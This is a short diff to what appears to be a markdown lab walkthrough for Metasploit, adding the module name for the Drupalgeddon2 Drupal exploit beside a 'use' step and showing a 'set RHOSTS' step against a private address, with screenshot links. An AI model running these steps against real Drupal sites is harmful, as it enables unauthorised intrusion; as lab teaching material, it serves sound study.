@@ -25,7 +25,7 @@
 -  you will get msf6
 -  And After
 - ![1_vYyh1BcTAxysdOKYpbWjYg](https://github.com/user-attachments/assets/88fb3e8a-d276-44f7-a44c-c35519021158)
--      use1
+-      use1 (exploit/unix/webapp/drupal_drupalgeddon2)
 - ![1_i0hVEshkcVHx4unvqfV4gg](https://github.com/user-attachments/assets/268ac80a-eb8a-4e81-a412-a280936df712)
 -       set RHOSTS 192.168.1.7
   ![1_dQ4C8mnztFsqlIDKfaET_Q](https://github.com/user-attachments/assets/ae64d4e2-16b3-4b48-b374-6c1a027e33a9)
